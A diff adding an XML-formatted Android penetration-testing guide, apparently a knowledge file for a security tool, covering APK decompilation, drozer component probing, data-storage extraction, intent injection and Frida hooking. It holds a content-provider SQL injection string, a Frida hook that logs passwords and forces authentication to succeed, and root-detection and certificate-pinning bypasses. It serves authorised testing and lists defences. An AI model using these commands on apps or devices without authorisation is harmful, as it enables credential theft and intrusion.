@@ -1,0 +1,289 @@
+<vulnerability_guide>
+  <title>ANDROID SECURITY TESTING</title>
+
+  <critical>Android's open nature provides more testing options than iOS, but also more complexity. Root access, APK modification, and runtime instrumentation enable comprehensive testing. Focus areas include exported components, content providers, insecure storage, and WebView vulnerabilities.</critical>
+
+  <scope>
+    - APK analysis and reverse engineering
+    - Component security (Activities, Services, Receivers, Providers)
+    - Data storage and logging analysis
+    - Root detection bypass
+    - Runtime manipulation with Frida
+    - Intent and deep link exploitation
+  </scope>
+
+  <methodology>
+    1. ENVIRONMENT SETUP
+       {% raw %}
+       # Testing options:
+       # - Physical rooted device
+       # - Android emulator (root by default)
+       # - Genymotion
+
+       # Essential tools:
+       # - ADB (Android Debug Bridge)
+       # - Frida / Objection
+       # - apktool
+       # - jadx / dex2jar
+       # - drozer
+       # - MobSF
+
+       # Connect device
+       adb devices
+       adb shell
+
+       # Check root
+       adb shell su
+
+       # Install Frida server
+       adb push frida-server /data/local/tmp/
+       adb shell "chmod 755 /data/local/tmp/frida-server"
+       adb shell "/data/local/tmp/frida-server &"
+       {% endraw %}
+
+    2. APK ANALYSIS
+       {% raw %}
+       # Decompile APK
+       apktool d target.apk -o decompiled/
+
+       # Java source extraction
+       jadx target.apk -d java_source/
+
+       # Analyze AndroidManifest.xml
+       cat decompiled/AndroidManifest.xml
+
+       # Check for:
+       # - android:exported="true" components
+       # - android:debuggable="true"
+       # - android:allowBackup="true"
+       # - Custom permissions
+       # - Intent filters
+
+       # String analysis
+       grep -r "password" java_source/
+       grep -r "api_key" java_source/
+       grep -r "secret" java_source/
+
+       # Search for hardcoded URLs
+       grep -rE "https?://" java_source/
+       {% endraw %}
+
+    3. COMPONENT SECURITY
+       {% raw %}
+       # Using drozer for component testing
+       drozer console connect
+
+       # List exported activities
+       run app.activity.info -a com.target.app
+
+       # Launch activity
+       run app.activity.start --component com.target.app com.target.app.AdminActivity
+
+       # List content providers
+       run app.provider.info -a com.target.app
+
+       # Query content provider
+       run app.provider.query content://com.target.app.provider/users
+
+       # SQL injection in provider
+       run app.provider.query content://com.target.app.provider/users --selection "1=1) OR 1=1--"
+
+       # Test broadcast receivers
+       run app.broadcast.send --component com.target.app --action com.target.ACTION
+       {% endraw %}
+
+    4. DATA STORAGE ANALYSIS
+       {% raw %}
+       # App data directory (requires root)
+       adb shell
+       su
+       cd /data/data/com.target.app
+
+       # Check shared preferences
+       cat shared_prefs/*.xml
+
+       # Check databases
+       sqlite3 databases/app.db ".dump"
+
+       # Check files
+       ls -la files/
+       cat files/config.json
+
+       # External storage (readable by all)
+       ls /sdcard/Android/data/com.target.app/
+
+       # Look for:
+       # - Plaintext credentials
+       # - Unencrypted sensitive data
+       # - World-readable files
+       # - Debug logs
+       {% endraw %}
+
+    5. INTENT TESTING
+       {% raw %}
+       # Deep link testing
+       adb shell am start -a android.intent.action.VIEW -d "myapp://action?id=1"
+
+       # Intent injection
+       adb shell am start -n com.target.app/.Activity \
+           --es "param" "malicious_value"
+
+       # Broadcast intent
+       adb shell am broadcast -a com.target.CUSTOM_ACTION \
+           --es "extra" "value"
+
+       # Check for:
+       # - Unvalidated deep link parameters
+       # - Exported activities accepting sensitive intents
+       # - Broadcast receivers without permission checks
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <frida_hooking>
+      {% raw %}
+      # Frida for runtime analysis
+
+      # Basic hook
+      Java.perform(function() {
+          var Activity = Java.use('com.target.app.LoginActivity');
+          Activity.checkPassword.implementation = function(password) {
+              console.log('Password: ' + password);
+              return true;  // Bypass
+          };
+      });
+
+      # Hook native library
+      Interceptor.attach(Module.findExportByName("libnative.so", "verify"), {
+          onEnter: function(args) {
+              console.log("verify called");
+          },
+          onLeave: function(retval) {
+              retval.replace(1);
+          }
+      });
+
+      # Using Objection
+      objection -g com.target.app explore
+      android hooking watch class com.target.app.AuthManager
+      {% endraw %}
+    </frida_hooking>
+
+    <root_detection_bypass>
+      {% raw %}
+      # Common root detection methods:
+      # - Check for su binary
+      # - Check for Magisk/SuperSU
+      # - Check /system partition writability
+      # - Check running processes
+
+      # Objection bypass
+      android root disable
+
+      # Frida script
+      Java.perform(function() {
+          var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
+          RootBeer.isRooted.implementation = function() {
+              return false;
+          };
+      });
+
+      # Magisk Hide
+      # Configure in Magisk Manager
+
+      # Patch APK to remove checks
+      {% endraw %}
+    </root_detection_bypass>
+
+    <webview_exploitation>
+      {% raw %}
+      # WebView vulnerabilities
+
+      # Check WebView settings
+      Java.perform(function() {
+          var WebView = Java.use('android.webkit.WebView');
+          var settings = WebView.getSettings.implementation;
+          // Check: setJavaScriptEnabled, setAllowFileAccess
+      });
+
+      # JavaScript interface injection
+      # If addJavascriptInterface used on API < 17
+      # Can execute arbitrary Java methods
+
+      # File access
+      # setAllowFileAccess(true)
+      # Access file:///data/data/com.target.app/
+
+      # URL loading
+      # Check for unvalidated URL loading
+      # XSS through WebView
+      {% endraw %}
+    </webview_exploitation>
+
+    <backup_extraction>
+      {% raw %}
+      # Android backup
+      adb backup -f backup.ab -apk com.target.app
+
+      # Convert to tar
+      dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress > backup.tar
+      # Or use android-backup-extractor
+
+      # Extract and analyze
+      tar xf backup.tar
+
+      # Check for sensitive data
+      # Databases, shared preferences, files
+
+      # Prevent: android:allowBackup="false"
+      {% endraw %}
+    </backup_extraction>
+
+    <network_security>
+      {% raw %}
+      # Network Security Config (Android 7+)
+      cat res/xml/network_security_config.xml
+
+      # Check for:
+      # - cleartext-traffic-permitted="true"
+      # - User certificate trust
+      # - Pin bypass configurations
+
+      # Certificate pinning bypass
+      objection -g com.target.app explore
+      android sslpinning disable
+
+      # Or patch APK
+      # Modify network_security_config.xml
+      # Rebuild and resign
+      {% endraw %}
+    </network_security>
+  </advanced_techniques>
+
+  <detection>
+    - Implement root/Frida detection
+    - Check for debuggable flag
+    - Validate APK signature
+    - Monitor for hooking frameworks
+    - Implement SafetyNet attestation
+  </detection>
+
+  <validation>
+    - Successfully decompile and analyze APK
+    - Access exported components
+    - Extract sensitive data from storage
+    - Bypass root/SSL pinning detection
+    - Exploit WebView vulnerabilities
+  </validation>
+
+  <pro_tips>
+    - android:debuggable="true" = easy debugging, often left in releases
+    - Content providers with path permissions are still often exploitable
+    - Frida works without root using frida-gadget in repackaged APK
+    - MobSF gives quick static analysis results
+    - Check both app and external storage for sensitive data
+    - WebView with addJavascriptInterface is RCE on old APIs
+  </pro_tips>
+
+  <remember>Android's component model is both its strength and weakness. Every exported Activity, Service, Receiver, and ContentProvider is an attack surface. The open nature means more places for developers to make mistakes. Always check permissions, data storage, and component exports. Frida and drozer are your best friends for dynamic analysis.</remember>
+</vulnerability_guide>
